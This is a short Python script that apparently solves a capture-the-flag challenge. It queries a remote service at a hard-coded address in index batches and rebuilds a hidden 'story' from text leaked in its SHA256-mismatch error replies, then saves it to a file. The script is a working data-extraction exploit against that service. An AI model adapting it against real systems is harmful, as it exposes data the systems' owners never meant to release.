#!/usr/bin/env python3
import socket

HOST, PORT = "154.57.164.76", 31595
story = ""
for base in range(0, 3000, 100):
    with socket.create_connection((HOST, PORT), timeout=5) as sock:
        sock.settimeout(3)
        sock.recv(4096)
        payload = ",".join(str(base + i) for i in range(100)) + "\n"
        sock.sendall(payload.encode())
        data = b""
        while b"Try again" not in data:
            data += sock.recv(65536)
    text = data.decode(errors="replace")
    marker = "SHA256 mismatch! The temple doors remain sealed shut!\n"
    chunk = text.split(marker, 1)[1].split("\nTry again", 1)[0]
    story += chunk
    print(base, len(chunk), repr(chunk[-20:]), flush=True)
    if len(chunk) < 100:
        break

open("story_leaked.txt", "w").write(story)
